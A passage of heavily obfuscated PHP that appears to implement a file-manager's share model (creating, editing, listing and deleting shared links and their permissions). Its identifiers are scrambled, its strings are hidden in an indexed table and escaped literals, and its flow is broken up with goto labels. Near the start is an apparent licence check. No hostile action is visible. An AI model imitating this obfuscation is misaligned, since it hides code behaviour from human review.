$fÈœ¼Âá¥å[827]); goto DãùªöÜ¾; Fí£‚ÒŞå: $fèåªòèä = $E¬‡Âá˜â($CÂÛåÖ·›®); $C‡×Šã‡ = explode($fÈœ¼Âá¥å[228], $fèåªòèä); if (count($C‡×Šã‡) < $fÈœ¼Âá¥å[577]) { $EæÕæË‡·¶ = $fÈœ¼Âá¥å[752]; $EæÕæË‡·¶(); } goto Bù—ñˆ·Š©; aŒŠìõºö: $aŞäê™Ï¸é = $fÈœ¼Âá¥å[824]; $E¬‡Âá˜â = $fÈœ¼Âá¥å[749]; $CÂÛåÖ·›® = $_SERVER[$fÈœ¼Âá¥å[750]] . $fÈœ¼Âá¥å[751]; goto Fí£‚ÒŞå; A£ÛÖ‘çØŸ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $eËß“”†êƒ) { $this->handle->flushall($eËß“”†êƒ); } return; } return $this->handle->flushAll(); } } goto B¥Ä¦áù”’; AŠôéÚŠé´: class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\x54\151\155\145", "\164\151\155\x65", "\151\x6e\x73\145\x72\164\x2c\x75\x70\144\141\x74\145", "\146\x75\x6e\143\x74\151\x6f\156"), array("\x63\162\x65\x61\x74\x65\x54\x69\155\145", "\164\151\x6d\145", "\x69\156\163\x65\x72\164", "\146\x75\x6e\x63\164\151\x6f\156"), array("\x6f\160\x74\x69\x6f\x6e\x73", '', "\x69\156\x73\145\162\164\54\165\x70\144\141\x74\x65\x2c\163\x65\154\x65\143\164", "\152\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Eª¯·ÊÄ¨£) { $Aºº‹ˆÉØ½ =& $_SERVER[Ïº«‚ßèÔˆø]; $eì¯£ˆá°„ = isset($Eª¯·ÊÄ¨£[0]) ? $Eª¯·ÊÄ¨£[0] : !1; return array($Aºº‹ˆÉØ½[1799] => array(USER_ID, $Aºº‹ˆÉØ½[1800]), $Aºº‹ˆÉØ½[1743] => array($eì¯£ˆá°„, $Aºº‹ˆÉØ½[1801])); } protected function listSimple() { $f˜¢„Ú¹Öƒ = array($_SERVER[Ïº«‚ßèÔˆø][1508] => USER_ID); $d¬¹Û¦à–Ÿ = $this->field($this->fieldList)->where($f˜¢„Ú¹Öƒ)->select(); return $d¬¹Û¦à–Ÿ ? $d¬¹Û¦à–Ÿ : array(); } protected function getInfo($e›Ôå°ƒãï, $aáÌÏ„÷š = false) { $AÜÓÑØç“‹ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($aáÌÏ„÷š) { return $this->_getShareInfo(array($AÜÓÑØç“‹[466] => $e›Ôå°ƒãï)); } $B‘«ÈµãÒº = $this->cacheFunctionGet($AÜÓÑØç“‹[1750], $e›Ôå°ƒãï); return $B‘«ÈµãÒº; } public function getInfoByHash($cÒÍ„ª—¿¯) { return $this->_getShareInfo(array($_SERVER[Ïº«‚ßèÔˆø][468] => $cÒÍ„ª—¿¯)); } public function getInfoByPath($Eà‹‡Ü¥§Í) { $EÁíÔ‰‡˜´ =& $_SERVER[Ïº«‚ßèÔˆø]; $e½±Åˆ›Ô— = array($EÁíÔ‰‡˜´[1508] => USER_ID, $EÁíÔ‰‡˜´[394] => $Eà‹‡Ü¥§Í); return $this->_getShareInfo($e½±Åˆ›Ô—); } public function getInfoBySourcePath($E‡¯ÔŸÇÛ) { $Dœ£Õ«‹¬ =& $_SERVER[Ïº«‚ßèÔˆø]; $d×öµˆº¶ = array($Dœ£Õ«‹¬[1508] => USER_ID, $Dœ£Õ«‹¬[1054] => $E‡¯ÔŸÇÛ); return $this->_getShareInfo($d×öµˆº¶); } private function _getShareInfo($A•ä¦ª¼ÓÛ) { goto E”Ÿ×ğİ‰; Eäì…‰Â¯Ú: $A•ä¦ª¼ÓÛ = array($eÏÃ”Ø³Ç[466] => $a“·Ç²ì„[$eÏÃ”Ø³Ç[466]]); $A¼–÷õóí¹ = $eÏÃ”Ø³Ç[1802]; $CùÛ»¸™ = Model($eÏÃ”Ø³Ç[563])->order($eÏÃ”Ø³Ç[392])->field($A¼–÷õóí¹)->where($A•ä¦ª¼ÓÛ)->select(); goto eËíÄ«¼; E”Ÿ×ğİ‰: $eÏÃ”Ø³Ç =& $_SERVER[Ïº«‚ßèÔˆø]; $a“·Ç²ì„ = $this->where($A•ä¦ª¼ÓÛ)->find(); if (!$a“·Ç²ì„) { return !1; } goto Eäì…‰Â¯Ú; eËíÄ«¼: if ($a“·Ç²ì„[$eÏÃ”Ø³Ç[394]] == $eÏÃ”Ø³Ç[495]) { $a“·Ç²ì„[$eÏÃ”Ø³Ç[85]] = IO::info($a“·Ç²ì„[$eÏÃ”Ø³Ç[1054]]); } else { $a“·Ç²ì„[$eÏÃ”Ø³Ç[85]] = Model($eÏÃ”Ø³Ç[1187])->pathInfo($a“·Ç²ì„[$eÏÃ”Ø³Ç[394]]); } $a“·Ç²ì„[$eÏÃ”Ø³Ç[1803]] = $CùÛ»¸™; return $a“·Ç²ì„; goto F±÷¿Ú™; F±÷¿Ú™: } protected function getInfoAuth($cÕ¥Ç©Ìµ—) { $DÏÂ—ç··· =& $_SERVER[Ïº«‚ßèÔˆø]; $fùÂ¾¯õÁ¬ = $this->getInfo($cÕ¥Ç©Ìµ—); $fùÂ¾¯õÁ¬[$DÏÂ—ç···[404]] = Model($DÏÂ—ç···[480])->authMake($fùÂ¾¯õÁ¬[$DÏÂ—ç···[1803]]); return $fùÂ¾¯õÁ¬; } protected function listData($EŒ¢Íå„òÂ = null, $CÅÉ‘áÅ×ø = 300) { $bÖ âø½âª =& $_SERVER[Ïº«‚ßèÔˆø]; $a¬†”›¢¹Ã = array(array($bÖ âø½âª[471] => array($bÖ âø½âª[953], 0), $bÖ âø½âª[473] => array($bÖ âø½âª[953], 0), $bÖ âø½âª[1804] => $bÖ âø½âª[1758])); if ($EŒ¢Íå„òÂ == $bÖ âø½âª[1805]) { $a¬†”›¢¹Ã = array($bÖ âø½âª[471] => 1); } else { if ($EŒ¢Íå„òÂ == $bÖ âø½âª[1039]) { $a¬†”›¢¹Ã = array($bÖ âø½âª[473] => 1); } } $a¬†”›¢¹Ã[$bÖ âø½âª[1508]] = USER_ID; $Bğ±šìÑ¿¦ = $this->where($a¬†”›¢¹Ã)->selectPage($CÅÉ‘áÅ×ø); return $Bğ±šìÑ¿¦; } protected function listToMe($Eİ„‹¢×µŠ = 300) { goto aÆŒÉî¹Ëà; C»°¿¢µƒ…: $A£•¥­ëï† = array($c™‘»ùÁ…Ô[1808] => $dä¸”¼Ÿ„Š, $c™‘»ùÁ…Ô[1809] => $aµï÷½¡‘[$c™‘»ùÁ…Ô[363]]); return $A£•¥­ëï†; goto a“ä¿°†À; D¨Ê»…ô‘Ä: $dä¸”¼Ÿ„Š = $this->field($A”ìøë‹£)->where($fÎª‰¸¾‘¯)->select(); foreach ($dä¸”¼Ÿ„Š as $FùòÓ¹•Ç‹ => &$a´Ä¸¯Âµ) { $a´Ä¸¯Âµ[$c™‘»ùÁ…Ô[1803]] = $Få¹£òâˆ[$a´Ä¸¯Âµ[$c™‘»ùÁ…Ô[466]]]; } unset($a´Ä¸¯Âµ); goto C»°¿¢µƒ…; Eñ‡©÷‚ğ™: if ($d¢Û‹¾ÓÌ•) { $fÎª‰¸¾‘¯ = array(array($c™‘»ùÁ…Ô[548] => SourceModel::TYPE_USER, $c™‘»ùÁ…Ô[482] => USER_ID), array($c™‘»ùÁ…Ô[548] => SourceModel::TYPE_GROUP, $c™‘»ùÁ…Ô[482] => array($c™‘»ùÁ…Ô[7], $d¢Û‹¾ÓÌ•)), $c™‘»ùÁ…Ô[1804] => $c™‘»ùÁ…Ô[1758]); } $aµï÷½¡‘ = Model($c™‘»ùÁ…Ô[563])->where($fÎª‰¸¾‘¯)->selectPage($Eİ„‹¢×µŠ); $Få¹£òâˆ = array_to_keyvalue_group($aµï÷½¡‘[$c™‘»ùÁ…Ô[366]], $c™‘»ùÁ…Ô[466]); goto bŸ‘ì÷³Ö¸; bŸ‘ì÷³Ö¸: if (!$Få¹£òâˆ) { return $aµï÷½¡‘; } $A”ìøë‹£ = $c™‘»ùÁ…Ô[1807]; $fÎª‰¸¾‘¯ = array($c™‘»ùÁ…Ô[466] => array($c™‘»ùÁ…Ô[409], array_keys($Få¹£òâˆ))); goto D¨Ê»…ô‘Ä; aÆŒÉî¹Ëà: $c™‘»ùÁ…Ô =& $_SERVER[Ïº«‚ßèÔˆø]; $d¢Û‹¾ÓÌ• = Model($c™‘»ùÁ…Ô[1806])->userGroupParents(USER_ID); $fÎª‰¸¾‘¯ = array($c™‘»ùÁ…Ô[548] => SourceModel::TYPE_USER, $c™‘»ùÁ…Ô[482] => USER_ID); goto Eñ‡©÷‚ğ™; a“ä¿°†À: } protected function shareAdd($EàÎÀ§„İæ, $a†œëÛ†ã„) { $aóÄšè¨¦ø =& $_SERVER[Ïº«‚ßèÔˆø]; $föÚÑ¯œ‡‚ = $this->_addShareData($EàÎÀ§„İæ, $a†œëÛ†ã„); if (!empty($a†œëÛ†ã„[$aóÄšè¨¦ø[1810]])) { $this->_shareAuthSet($föÚÑ¯œ‡‚, $a†œëÛ†ã„[$aóÄšè¨¦ø[1810]]); } $this->shareEventAdd($EàÎÀ§„İæ, $a†œëÛ†ã„, $aóÄšè¨¦ø[1042]); return $föÚÑ¯œ‡‚; } private function shareEventAdd($b¶°¥¶ŞÉ, $a„º˜ÑÄâ§, $DöâÍ ï…Œ = "\141\144\144") { goto D‰Ø—²×Ò™; B¾§Á‡ì: return; goto eÅÜ¶§âèÈ; D‰Ø—²×Ò™: $bØ’ñ•Ï…Ë =& $_SERVER[Ïº«‚ßèÔˆø]; if ($DöâÍ ï…Œ == $bØ’ñ•Ï…Ë[1042]) { if ($a„º˜ÑÄâ§[$bØ’ñ•Ï…Ë[471]] == $bØ’ñ•Ï…Ë[87]) { Model($bØ’ñ•Ï…Ë[532])->eventShare($b¶°¥¶ŞÉ, $bØ’ñ•Ï…Ë[1811]); } if ($a„º˜ÑÄâ§[$bØ’ñ•Ï…Ë[473]] == $bØ’ñ•Ï…Ë[87]) { Model($bØ’ñ•Ï…Ë[532])->eventShare($b¶°¥¶ŞÉ, $bØ’ñ•Ï…Ë[1812]); } return; } $cÁ‹÷²À—Æ = $this->getInfoByPath($b¶°¥¶ŞÉ); goto cŠĞ‘õ¼İ; CÅ‚ÎÏŞÈ÷: if ($cÁ‹÷²À—Æ[$bØ’ñ•Ï…Ë[473]] == $bØ’ñ•Ï…Ë[495] && $a„º˜ÑÄâ§[$bØ’ñ•Ï…Ë[473]] == $bØ’ñ•Ï…Ë[87]) { $a‹ùÛÚ²£Ô = $bØ’ñ•Ï…Ë[1812]; } if ($cÁ‹÷²À—Æ[$bØ’ñ•Ï…Ë[473]] == $bØ’ñ•Ï…Ë[87] && $a„º˜ÑÄâ§[$bØ’ñ•Ï…Ë[473]] == $bØ’ñ•Ï…Ë[495]) { $a‹ùÛÚ²£Ô = $bØ’ñ•Ï…Ë[1815]; } Model($bØ’ñ•Ï…Ë[532])->eventShare($b¶°¥¶ŞÉ, $a‹ùÛÚ²£Ô); goto B¾§Á‡ì; cŠĞ‘õ¼İ: $a‹ùÛÚ²£Ô = $bØ’ñ•Ï…Ë[1813]; if ($cÁ‹÷²À—Æ[$bØ’ñ•Ï…Ë[471]] == $bØ’ñ•Ï…Ë[495] && $a„º˜ÑÄâ§[$bØ’ñ•Ï…Ë[471]] == $bØ’ñ•Ï…Ë[87]) { $a‹ùÛÚ²£Ô = $bØ’ñ•Ï…Ë[1811]; } if ($cÁ‹÷²À—Æ[$bØ’ñ•Ï…Ë[471]] == $bØ’ñ•Ï…Ë[87] && $a„º˜ÑÄâ§[$bØ’ñ•Ï…Ë[471]] == $bØ’ñ•Ï…Ë[495]) { $a‹ùÛÚ²£Ô = $bØ’ñ•Ï…Ë[1814]; } goto CÅ‚ÎÏŞÈ÷; eÅÜ¶§âèÈ: } private function _addShareData($B¶ŒºäÔÁ‘, $b—Õ¯¸‘ì¡ = array()) { goto cÄ–Ä¶„šŠ; cä³¨ËåäĞ: $FŒ°‰Å¿£ù = array($fâ¥ÕÊóÈ…[1500] => USER_ID, $fâ¥ÕÊóÈ…[408] => $B¶ŒºäÔÁ‘, $fâ¥ÕÊóÈ…[1414] => $fâ¥ÕÊóÈ…[33], $fâ¥ÕÊóÈ…[471] => 0, $fâ¥ÕÊóÈ…[473] => 0, $fâ¥ÕÊóÈ…[1054] => $fâ¥ÕÊóÈ…[33], $fâ¥ÕÊóÈ…[304] => $fâ¥ÕÊóÈ…[33], $fâ¥ÕÊóÈ…[833] => $fâ¥ÕÊóÈ…[33], $fâ¥ÕÊóÈ…[1817] => 0, $fâ¥ÕÊóÈ…[1818] => 0, $fâ¥ÕÊóÈ…[474] => 0, $fâ¥ÕÊóÈ…[475] => $fâ¥ÕÊóÈ…[33], $fâ¥ÕÊóÈ…[468] => $fâ¥ÕÊóÈ…[33]); $Dé¡šÎ÷·² = explode($fâ¥ÕÊóÈ…[47], $fâ¥ÕÊóÈ…[1819]); foreach ($Dé¡šÎ÷·² as $CæŞÕñÄ‡ò) { if (!isset($b—Õ¯¸‘ì¡[$CæŞÕñÄ‡ò])) { continue; } $FŒ°‰Å¿£ù[$CæŞÕñÄ‡ò] = $b—Õ¯¸‘ì¡[$CæŞÕñÄ‡ò]; } goto FÀÜÖË´½Ä; EĞ‹ š¨«: return $a†—ä—ÜóÍ; goto Bğ®Š…ÆÜ¾; FÀÜÖË´½Ä: $a†—ä—ÜóÍ = $this->add($FŒ°‰Å¿£ù); $Cï»ô”‚  = array($fâ¥ÕÊóÈ…[468] => short_id($a†—ä—ÜóÍ)); $this->where(array($fâ¥ÕÊóÈ…[465] => $a†—ä—ÜóÍ))->save($Cï»ô”‚ ); goto EĞ‹ š¨«; eˆ»ö´…¶¹: if ($Dêãƒ¾¶… = $this->where($b¢êÑÖ‡øË)->find()) { return $Dêãƒ¾¶…[$fâ¥ÕÊóÈ…[466]]; } if ($B¶ŒºäÔÁ‘ == 0) { $Dé®¸ƒ“Û‰ = array($fâ¥ÕÊóÈ…[28] => get_path_this($b—Õ¯¸‘ì¡[$fâ¥ÕÊóÈ…[76]])); } else { $Dé®¸ƒ“Û‰ = Model($fâ¥ÕÊóÈ…[782])->sourceInfo($B¶ŒºäÔÁ‘); if (!$Dé®¸ƒ“Û‰) { return !1; } } if (!$b—Õ¯¸‘ì¡[$fâ¥ÕÊóÈ…[1414]]) { $b—Õ¯¸‘ì¡[$fâ¥ÕÊóÈ…[1414]] = $Dé®¸ƒ“Û‰[$fâ¥ÕÊóÈ…[28]]; } goto cä³¨ËåäĞ; cÄ–Ä¶„šŠ: $fâ¥ÕÊóÈ… =& $_SERVER[Ïº«‚ßèÔˆø]; $b¢êÑÖ‡øË = array($fâ¥ÕÊóÈ…[408] => $B¶ŒºäÔÁ‘, $fâ¥ÕÊóÈ…[1500] => USER_ID); if ($B¶ŒºäÔÁ‘ == 0) { $b¢êÑÖ‡øË = array($fâ¥ÕÊóÈ…[1816] => $b—Õ¯¸‘ì¡[$fâ¥ÕÊóÈ…[1054]], $fâ¥ÕÊóÈ…[1500] => USER_ID); } goto eˆ»ö´…¶¹; Bğ®Š…ÆÜ¾: } private function _shareAuthSet($d´—äÇ–ïñ, $f‡Š´¡æá) { goto f­ƒÛà‚³õ; f†Ô°ÚœÖ’: return $dßÇŒïéöî->addAll($a¨‡ïœ‹ß…, array(), !0); goto Fšˆ…íàò; f­ƒÛà‚³õ: $DçË¤³¡· =& $_SERVER[Ïº«‚ßèÔˆø]; if (!is_array($f‡Š´¡æá)) { return !1; } $dßÇŒïéöî = Model($DçË¤³¡·[1770]); goto D¤ï—÷±Åê; D¤ï—÷±Åê: $dßÇŒïéöî->where(array($DçË¤³¡·[466] => $d´—äÇ–ïñ))->delete(); $a¨‡ïœ‹ß… = array(); foreach ($f‡Š´¡æá as $FÂíš«‚›’) { $eÔÅÇ“«î± = SourceModel::TYPE_USER; if ($FÂíš«‚›’[$DçË¤³¡·[402]] == SourceModel::TYPE_GROUP) { $eÔÅÇ“«î± = SourceModel::TYPE_GROUP; } $d˜‘‡ÍöÏ– = array($DçË¤³¡·[466] => $d´—äÇ–ïñ, $DçË¤³¡·[402] => $eÔÅÇ“«î±, $DçË¤³¡·[482] => intval($FÂíš«‚›’[$DçË¤³¡·[482]]), $DçË¤³¡·[1766] => 0, $DçË¤³¡·[1820] => -1); if ($FÂíš«‚›’[$DçË¤³¡·[1766]]) { $d˜‘‡ÍöÏ–[$DçË¤³¡·[1766]] = $FÂíš«‚›’[$DçË¤³¡·[1766]]; } else { if ($FÂíš«‚›’[$DçË¤³¡·[1820]]) { $d˜‘‡ÍöÏ–[$DçË¤³¡·[1820]] = $FÂíš«‚›’[$DçË¤³¡·[1820]]; } } $a¨‡ïœ‹ß…[] = $d˜‘‡ÍöÏ–; } goto f†Ô°ÚœÖ’; Fšˆ…íàò: } public function numViewAdd($a¯ÄŠ½Øô±) { $fİÇ³Ÿ¾Ø‘ =& $_SERVER[Ïº«‚ßèÔˆø]; $aÌ”˜Ğ±ù† = array($fİÇ³Ÿ¾Ø‘[465] => $a¯ÄŠ½Øô±); $this->where($aÌ”˜Ğ±ù†)->setAdd($fİÇ³Ÿ¾Ø‘[1817]); } public function numDownloadAdd($EääŸ×ˆ¦) { $B‚µÌÉÉ’ö =& $_SERVER[Ïº«‚ßèÔˆø]; $eì¨àÌ§Š = array($B‚µÌÉÉ’ö[465] => $EääŸ×ˆ¦); $this->where($eì¨àÌ§Š)->setAdd($B‚µÌÉÉ’ö[1818]); } protected function shareEdit($Eˆ÷…±Õ‚†, $fµ„¶´§ˆ½) { goto F˜Ûˆ·¸Ô; CÓ‚‡Ëµë‚: if (isset($fµ„¶´§ˆ½[$AÊöÈïÂù[1810]])) { $this->_shareAuthSet($Eˆ÷…±Õ‚†, $fµ„¶´§ˆ½[$AÊöÈïÂù[1810]]); } return !0; goto B²Ú©Ä©‚; FĞÁµ¼†Ã: $this->_checkLinkShare($fµ„¶´§ˆ½, $d¾øˆ¦‡ó); $cÕ¼¦˜Üùó = array(); $aïî±«‘ = explode($AÊöÈïÂù[47], $AÊöÈïÂù[1821]); goto F‰†Óˆ; F‰†Óˆ: foreach ($aïî±«‘ as $Bºˆ„‹çé) { if (!array_key_exists($Bºˆ„‹çé, $fµ„¶´§ˆ½)) { continue; } $cÕ¼¦˜Üùó[$Bºˆ„‹çé] = $fµ„¶´§ˆ½[$Bºˆ„‹çé]; } $this->shareEventAdd($d¾øˆ¦‡ó[$AÊöÈïÂù[394]], $fµ„¶´§ˆ½, $AÊöÈïÂù[1638]); $this->where(array($AÊöÈïÂù[465] => $Eˆ÷…±Õ‚†))->save($cÕ¼¦˜Üùó); goto CÓ‚‡Ëµë‚; F˜Ûˆ·¸Ô: $AÊöÈïÂù =& $_SERVER[Ïº«‚ßèÔˆø]; $d¾øˆ¦‡ó = $this->getInfo($Eˆ÷…±Õ‚†); if (!$d¾øˆ¦‡ó) { return !1; } goto FĞÁµ¼†Ã; B²Ú©Ä©‚: } private function _checkLinkShare($f©â¤Ë·•º, $F—éçó³äø) { goto C¯…È¡è«; D•·ÌâÏŠì: if ($F—éçó³äø[$CË„¬é¢±[85]][$CË„¬é¢±[29]] != $CË„¬é¢±[192]) { $eç—ğÉ—‘– = $this->_folderReport($a¡“™ğÎ–‚); if (!$eç—ğÉ—‘–) { return; } show_json(LNG($CË„¬é¢±[1822]) . $CË„¬é¢±[1823] . $eç—ğÉ—‘–, !1); } $FÊŞç±¹Ë = Model($CË„¬é¢±[782])->fileInfoGet($F—éçó³äø[$CË„¬é¢±[85]][$CË„¬é¢±[394]]); if (!$FÊŞç±¹Ë) { return; } goto d™ò²†óØÃ; d™ò²†óØÃ: $b¨Äì¦Ç‘¸ = $this->shareFileMeta($FÊŞç±¹Ë[$CË„¬é¢±[445]]); if (isset($b¨Äì¦Ç‘¸[$CË„¬é¢±[371]]) && $b¨Äì¦Ç‘¸[$CË„¬é¢±[371]] == $CË„¬é¢±[87]) { show_json(LNG($CË„¬é¢±[1824]), !1); } goto eó„î¿…»“; C¯…È¡è«: $CË„¬é¢± =& $_SERVER[Ïº«‚ßèÔˆø]; if ($f©â¤Ë·•º[$CË„¬é¢±[471]] != $CË„¬é¢±[87]) { return; } $a¡“™ğÎ–‚ = $F—éçó³äø[$CË„¬é¢±[85]][$CË„¬é¢±[394]]; goto D•·ÌâÏŠì; eó„î¿…»“: } private function _folderReport($eİ›è¹ Ÿ) { goto E¼´×ƒÉùì; E¼´×ƒÉùì: $aø½ö¥ÑÒ™ =& $_SERVER[Ïº«‚ßèÔˆø]; $e”Ş¥¨»¿Ü = array($aø½ö¥ÑÒ™[445] => array($aø½ö¥ÑÒ™[953], 0), $aø½ö¥ÑÒ™[697] => 3); $c÷¿Çí³ˆ„ = Model($aø½ö¥ÑÒ™[1825])->where($e”Ş¥¨»¿Ü)->field($aø½ö¥ÑÒ™[445])->select(); goto A·›±×Š»Ø; D§“‚£ŒŞ‚: $e”Ş¥¨»¿Ü = array($aø½ö¥ÑÒ™[445] => array($aø½ö¥ÑÒ™[7], $c÷¿Çí³ˆ„), $aø½ö¥ÑÒ™[485] => array($aø½ö¥ÑÒ™[379], "\45{$aÍ¥‚ÈÍÉ§}\x25"), $aø½ö¥ÑÒ™[421] => 0); $F¤’ÜŸò‡‹ = Model($aø½ö¥ÑÒ™[782])->where($e”Ş¥¨»¿Ü)->field($aø½ö¥ÑÒ™[1826])->find(); if (!$F¤’ÜŸò‡‹) { return !1; } goto e¼©»™½‡Ô; Eƒ±‰ÍŸ: $BÜ·âÕƒàÄ = array_to_keyvalue($BÃÇ¦ïò…¦, $aø½ö¥ÑÒ™[33], $aø½ö¥ÑÒ™[28]); $BÜ·âÕƒàÄ[] = $F¤’ÜŸò‡‹[$aø½ö¥ÑÒ™[28]]; return implode($aø½ö¥ÑÒ™[8], $BÜ·âÕƒàÄ); goto c”ÊöÆ‡¨„; A·›±×Š»Ø: if (!$c÷¿Çí³ˆ„) { return !1; } $c÷¿Çí³ˆ„ = array_to_keyvalue($c÷¿Çí³ˆ„, $aø½ö¥ÑÒ™[33], $aø½ö¥ÑÒ™[445]); $aÍ¥‚ÈÍÉ§ = $aø½ö¥ÑÒ™[47] . $eİ›è¹ Ÿ . $aø½ö¥ÑÒ™[47]; goto D§“‚£ŒŞ‚; e¼©»™½‡Ô: $B„Å ºË–é = substr($F¤’ÜŸò‡‹[$aø½ö¥ÑÒ™[485]], strpos($F¤’ÜŸò‡‹[$aø½ö¥ÑÒ™[485]], $aÍ¥‚ÈÍÉ§)); $e”Ş¥¨»¿Ü = array($aø½ö¥ÑÒ™[394] => array($aø½ö¥ÑÒ™[7], trim($B„Å ºË–é, $aø½ö¥ÑÒ™[47]))); $BÃÇ¦ïò…¦ = Model($aø½ö¥ÑÒ™[782])->where($e”Ş¥¨»¿Ü)->field($aø½ö¥ÑÒ™[28])->select(); goto Eƒ±‰ÍŸ; c”ÊöÆ‡¨„: } protected function remove($aÌ¡©ÃòÜ) { goto eö¹²©˜; eö¹²©˜: $cæ‚İÊŸî¿ =& $_SERVER[Ïº«‚ßèÔˆø]; if (is_array($aÌ¡©ÃòÜ)) { $aÌ¡©ÃòÜ = array($cæ‚İÊŸî¿[7], $aÌ¡©ÃòÜ); } $BªöÒ»êâÉ = array($cæ‚İÊŸî¿[466] => $aÌ¡©ÃòÜ); goto a·í¨‡‹Ä”; a·í¨‡‹Ä”: $Aß‰Ñ Î° = $this->where($BªöÒ»êâÉ)->delete(); if ($Aß‰Ñ Î°) { Model($cæ‚İÊŸî¿[563])->where(array($cæ‚İÊŸî¿[466] => $aÌ¡©ÃòÜ))->delete(); } $DŒæ†ååª¬ = is_array($aÌ¡©ÃòÜ) ? $aÌ¡©ÃòÜ[1] : array($aÌ¡©ÃòÜ); goto dœ†‹Áà; dœ†‹Áà: for ($D¾ˆÍÊä¾Ñ = 0; $D¾ˆÍÊä¾Ñ < count($DŒæ†ååª¬); $D¾ˆÍÊä¾Ñ++) { $eÃÚ¥¬××‹ = $this->getInfo($DŒæ†ååª¬[$D¾ˆÍÊä¾Ñ]); if ($eÃÚ¥¬××‹[$cæ‚İÊŸî¿[473]] == $cæ‚İÊŸî¿[87]) { Model($cæ‚İÊŸî¿[532])->eventShare($eÃÚ¥¬××‹[$cæ‚İÊŸî¿[394]], $cæ‚İÊŸî¿[1815]); } if ($eÃÚ¥¬××‹[$cæ‚İÊŸî¿[471]] == $cæ‚İÊŸî¿[87]) { Model($cæ‚İÊŸî¿[532])->eventShare($eÃÚ¥¬××‹[$cæ‚İÊŸî¿[394]], $cæ‚İÊŸî¿[1814]); } } return $Aß‰Ñ Î°; goto EêÕŞ¼Òö; EêÕŞ¼Òö: } protected function removeBySource($b‘ˆ‚÷ùéÊ) { goto D¦Ñ•™; a¾õÁÖ½³³: $c‰Æ•ÚÃ¬¬ = array_to_keyvalue($c‰Æ•ÚÃ¬¬, $Eª’®ßÉ‘[33], $Eª’®ßÉ‘[466]); if (!$c‰Æ•ÚÃ¬¬) { return; } $BñÀà„ñó˜ = array($Eª’®ßÉ‘[465] => array($Eª’®ßÉ‘[409], $c‰Æ•ÚÃ¬¬)); goto aù»ŠÂ†ï; aù»ŠÂ†ï: $this->where($BñÀà„ñó˜)->delete(); Model($Eª’®ßÉ‘[563])->where($BñÀà„ñó˜)->delete(); goto F·ÓÛ³ÃÎÏ; D¦Ñ•™: $Eª’®ßÉ‘ =& $_SERVER[Ïº«‚ßèÔˆø]; $BñÀà„ñó˜ = array($Eª’®ßÉ‘[408] => array($Eª’®ßÉ‘[409], $b‘ˆ‚÷ùéÊ)); $c‰Æ•ÚÃ¬¬ = $this->field($Eª’®ßÉ‘[466])->where($BñÀà„ñó˜)->select(); goto a¾õÁÖ½³³; F·ÓÛ³ÃÎÏ: } public function listAll($C¢‡µ‚ÜİÄ) { goto E¦¶Äé³‹Õ; e™Â‡Â¬ Ş: return $dñ¶°«Ø; goto E‰Èêßï¢; Fğ¡¬òšôÛ: $dñ¶°«Ø = $this->_makeOrder()->where($eî¼Ò²º¢)->selectPage(20); if (empty($dñ¶°«Ø[$fŠ‰éæ„„[366]])) { return array(); } $this->_listDataApply($dñ¶°«Ø[$fŠ‰éæ„„[366]]); goto e™Â‡Â¬ Ş; C£¬ôê™÷Ö: if ($C¢‡µ‚ÜİÄ[$fŠ‰éæ„„[705]]) { $E‰‡¯Îëï£ = $C¢‡µ‚ÜİÄ[$fŠ‰éæ„„[474]] ? $C¢‡µ‚ÜİÄ[$fŠ‰éæ„„[474]] : strtotime(date($fŠ‰éæ„„[1827])); $eî¼Ò²º¢[$fŠ‰éæ„„[193]] = array($fŠ‰éæ„„[330], array($C¢‡µ‚ÜİÄ[$fŠ‰éæ„„[705]], $E‰‡¯Îëï£)); } if ($C¢‡µ‚ÜİÄ[$fŠ‰éæ„„[29]]) { $eî¼Ò²º¢[$C¢‡µ‚ÜİÄ[$fŠ‰éæ„„[29]]] = 1; } else { $eî¼Ò²º¢[] = array($fŠ‰éæ„„[471] => array($fŠ‰éæ„„[953], 0), $fŠ‰éæ„„[473] => array($fŠ‰éæ„„[953], 0), $fŠ‰éæ„„[1804] => $fŠ‰éæ„„[1758]); } if ($C¢‡µ‚ÜİÄ[$fŠ‰éæ„„[1754]]) { $eî¼Ò²º¢[] = array($fŠ‰éæ„„[468] => $C¢‡µ‚ÜİÄ[$fŠ‰éæ„„[1754]], $fŠ‰éæ„„[1414] => array($fŠ‰éæ„„[379], "\x25{$C¢‡µ‚ÜİÄ[$fŠ‰éæ„„[1754]]}\x25"), $fŠ‰éæ„„[1804] => $fŠ‰éæ„„[1758]); } goto Fğ¡¬òšôÛ; E¦¶Äé³‹Õ: $fŠ‰éæ„„ =& $_SERVER[Ïº«‚ßèÔˆø]; $eî¼Ò²º¢ = array(); if ($C¢‡µ‚ÜİÄ[$fŠ‰éæ„„[1508]]) { $eî¼Ò²º¢[$fŠ‰éæ„„[1508]] = $C¢‡µ‚ÜİÄ[$fŠ‰éæ„„[1508]]; } goto C£¬ôê™÷Ö; E‰Èêßï¢: } public function listDataApply($EõÎØÇƒ¹«) { $this->_listDataApply($EõÎØÇƒ¹«); return $EõÎØÇƒ¹«; } private function _listDataApply(&$EÜ¦Òîõ·) { goto F¨Š¥‚Â¦¼; F¨Š¥‚Â¦¼: $d•ŸÉ£àñ‚ =& $_SERVER[Ïº«‚ßèÔˆø]; $e¾«Á§ğë = array_to_keyvalue($EÜ¦Òîõ·, $d•ŸÉ£àñ‚[33], $d•ŸÉ£àñ‚[1508]); $A›ĞÁÈÙ± = Model($d•ŸÉ£àñ‚[505])->userListInfo(array_unique($e¾«Á§ğë)); goto AØ˜â‹‚‹©; EøÉßùÉÔ˜: unset($FêŒ ÓÄ); $EÜ¦Òîõ· = array_values($EÜ¦Òîõ·); goto C°ãÙÁº; AØ˜â‹‚‹©: $D„“ìÊé•ˆ = array_to_keyvalue($EÜ¦Òîõ·, $d•ŸÉ£àñ‚[33], $d•ŸÉ£àñ‚[394]); $AÏŒ¿‚Æ± = Model($d•ŸÉ£àñ‚[782])->sourceListInfo($D„“ìÊé•ˆ, !0); foreach ($EÜ¦Òîõ· as $EÄÈùàïÅ± => &$FêŒ ÓÄ) { $bø‘°»ğî÷ = $FêŒ ÓÄ[$d•ŸÉ£àñ‚[1508]]; $FêŒ ÓÄ[$d•ŸÉ£àñ‚[1828]] = $A›ĞÁÈÙ±[$bø‘°»ğî÷] ? $A›ĞÁÈÙ±[$bø‘°»ğî÷] : !1; 